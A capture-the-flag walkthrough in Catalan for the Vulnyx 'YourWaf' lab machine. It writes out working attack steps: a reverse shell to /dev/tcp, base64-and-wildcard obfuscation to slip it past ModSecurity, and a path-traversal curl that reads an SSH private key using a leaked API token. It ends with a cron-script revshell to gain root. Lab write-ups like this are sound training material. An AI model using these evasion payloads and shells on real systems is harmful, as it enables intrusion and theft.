---
author: Lenam
pubDatetime: 2024-05-26T15:22:00Z
title: WriteUp YourWaf - Vulnyx
slug: yourwaf-writeup-vulnyx-ca
featured: false
draft: false
ogImage: "assets/yourwaf/OpenGraph.png"
tags:
  - writeup
  - vulnyx
  - WAF 
  - RCE
  - CRON
description: 
  He intentat crear un CTF per practicar l’esquiva del WAF ModSecurity d’Apache.
lang: ca
---

La màquina té dues banderes, una per a l'usuari i una per a root.

![img_p0_1](/assets/yourwaf/img_p0_1.png)

He intentat crear un CTF per practicar l’esquiva del WAF ModSecurity d’Apache.

Espero que ho gaudeixis.

## Taula de continguts

## Enumeració, Ports i Serveis

`$ nmap -p- 192.168.1.195 -oN nmap.txt -vvv`

![img_p1_1](/assets/yourwaf/img_p1_1.png)

Hem trobat 3 ports oberts: 22, 80, 3000 (SSH, HTTP i ppp?). Mirem més a fons els tres ports per intentar obtenir més informació.

`$ nmap -sV -sC -A -p 80,22 192.168.1.195 -oN nmap2.txt -vvv`

![img_p1_2](/assets/yourwaf/img_p1_2.png)

El port 3000 sembla ser una aplicació Node.js amb Express.

Tento accedir al web al port 80, redireccionant al domini www.yourwaf.nyx, l’afegeixo al fitxer /etc/hosts i actualitzo l’adreça al navegador, aquesta vegada a través del domini.

![img_p1_3](/assets/yourwaf/img_p1_3.png)

Apareix un lloc web amb informació sobre ModSecurity.

![img_p2_1](/assets/yourwaf/img_p2_1.png)

Quan utilitzo l'eina whatweb, sembla ser detectada pel WAF, però quan afegeixo un "User-Agent" diferent, sembla obtenir els resultats:

![img_p2_2](/assets/yourwaf/img_p2_2.png)

Hi ha eines com whatwaf, però no ho veig necessari ja que el lloc web mostra informació sobre ModSecurity.

[](https://github.com/Ekultek/WhatWaf)[https://github.com/Ekultek/WhatWaf](https://github.com/Ekultek/WhatWaf)

Fem una enumeració de directoris i fitxers al lloc web però no trobem res interessant.

Veiem que hem trobat el port 3000 i torna el missatge "Unauthorized", així que realitzem una enumeració de directoris en aquest port.

![img_p2_3](/assets/yourwaf/img_p2_3.png)

![img_p2_4](/assets/yourwaf/img_p2_4.png)

Trobarem diverses adreces al port 3000, però l’única que ens mostra informació és el camí http://www.yourwaf.nyx:3000/logs.

Aquesta adreça sembla mostrar informació dels registres de ModSecurity d’Apache. Pots veure totes les vegades que les nostres "enumeracions" han fallat.

![img_p3_1](/assets/yourwaf/img_p3_1.png)

Com que tenim un domini, intentem comprovar si hi ha subdominis o hosts virtuals amb altres dominis configurats, afegim un "User-Agent" al escaneador per evitar el WAF al servidor:

![img_p3_2](/assets/yourwaf/img_p3_2.png)

Trobarem un altre subdomini maintenance.yourwaf.nyx, afegim el subdomini a /etc/hosts i obrim el navegador per veure què trobem.

![img_p3_3](/assets/yourwaf/img_p3_3.png)

Trobarem una magnífica execució de comandes per a manteniment del servidor:

Està protegit pel WAF ModSecurity, però podem provar els següents exemples.

![img_p4_1](/assets/yourwaf/img_p4_1.png)

## Intrusió

Si entrem `ls`:

![img_p5_1](/assets/yourwaf/img_p5_1.png)

Si entrem `cat index.php`:

![img_p5_2](/assets/yourwaf/img_p5_2.png)

Intentem utilitzar caràcters comodí:
`/bin/cat index.php`

Intentem alguna cosa amb:

`/?i?/c?t index.php`

Però retorna un error:

![img_p5_3](/assets/yourwaf/img_p5_3.png)

Provem el mateix, però també codifiquem la sortida en base64:

`/?i?/c?t index.php | base64`

Aquesta vegada obtenim un text en base64:

![img_p6_1](/assets/yourwaf/img_p6_1.png)

En convertir-ho a text pla, finalment obtenim el codi font de index.php després de molt de text incomprensible de possibles comandes executades:

![img_p6_2](/assets/yourwaf/img_p6_2.png)

Com pots veure, el codi no té validació, així que intentem crear un revshell que ModSecurity pugui "empassar":

Creem un revshell simple i el codifiquem en base64:

`sh -i >& /dev/tcp/192.168.1.116/433 0>&1`

En base64:

`c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjExNi80MzMgMD4mMQ==`

La idea és executar:

`/bin/echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjExNi80MzMgMD4mMQ== | base64 -d | /bin/bash -e`

Si l’executem tal com està, ens mostrarà un "Forbidden", però si ho transformem amb caràcters comodí "?", per exemple:

`/???/e??o c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjExNi80MzMgMD4mMQ== | base64 -d | /???/b??h -e`

Obtenim un revshell amb l'usuari www-data.

## Moviment lateral cap a tester

Ara podem enumerar els usuaris del sistema

![img_p8_1](/assets/yourwaf/img_p8_1.png)

Veiem un usuari: tester.

A quins grups pertany www-data:

![img_p8_2](/assets/yourwaf/img_p8_2.png)

Tant a `/var/www/www.yourwaf.nyx` com a `/var/www/maintenance.yourwaf.nyx`, no trobem res interessant, i l'usuari www-data no té permisos per modificar res aquí.

Però trobem alguna cosa interessant a la carpeta `/opt/nodeapp`, que sembla ser l’aplicació mostrada al port 3000. Mirem el codi de l’aplicació:

`www-data@yourwaf:/opt/nodeapp$ cat /opt/nodeapp/server.js`

Com es veu a la imatge següent, pots passar un paràmetre amb el token que apareix al codi per cridar als endpoints privats de l’API al port 3000. Això ens permet executar l’endpoint /readfile per llegir fitxers amb aquest servei executat per l'usuari root.

Hem de tenir cura amb l’endpoint “/restart” ja que reiniciarà el servidor.

![img_p9_1](/assets/yourwaf/img_p9_1.png)

Utilitzant les dades obtingudes de la programació de l'API en node.js, intentem obtenir les banderes però no ho aconseguim. No obstant això, aconseguim obtenir l’id_rsa de tester:

`curl -o id_rsa 'http://www.yourwaf.nyx:3000/readfile?api-token=8c2b6a304191b8e2d81aaa5d1131d83d&file=../../../../home/tester/.ssh/id_rsa'`

Obtenim l’id_rsa de tester:

![img_p10_1](/assets/yourwaf/img_p10_1.png)

Intentem utilitzar l’id_rsa per iniciar sessió via ssh amb l’usuari tester, però està protegit amb una contrasenya. Intentem crackejar-la amb rockyou.txt.

![img_p10_3](/assets/yourwaf/img_p10_3.png)

![img_p10_2](/assets/yourwaf/img_p10_2.png)

Després d’una estona, no més de 5 minuts, trobem la contrasenya de l’id_rsa.

![img_p10_4](/assets/yourwaf/img_p10_4.png)

## Escalada de privilegis de tester a root

Iniciem sessió via SSH amb la clau id_rsa i la contrasenya.

![img_p11_1](/assets/yourwaf/img_p11_1.png)

Veiem que l'usuari pertany al grup copylogs. Comprovem tots els fitxers als quals podem escriure amb l'usuari copylogs.

![img_p11_2](/assets/yourwaf/img_p11_2.png)

Trobo un fitxer que té permisos d’escriptura

 dins la carpeta de l’aplicació node.js.

Veiem un fitxer anomenat ecosystem.config.js que pertany a l’aplicació PM2, un creador de demons per a aplicacions node.js, i veiem que està instal·lat.

![img_p11_3](/assets/yourwaf/img_p11_3.png)

Com es pot veure al fitxer, copylogs.sh s’executa cada 10 segons.

Més informació: https://pm2.keymetrics.io/

Modifiquem el fitxer copylogs.sh inserint un revshell i comencem a escoltar.

![img_p12_1](/assets/yourwaf/img_p12_1.png)

Accedim com a root i ara podem veure el fitxer de la bandera root.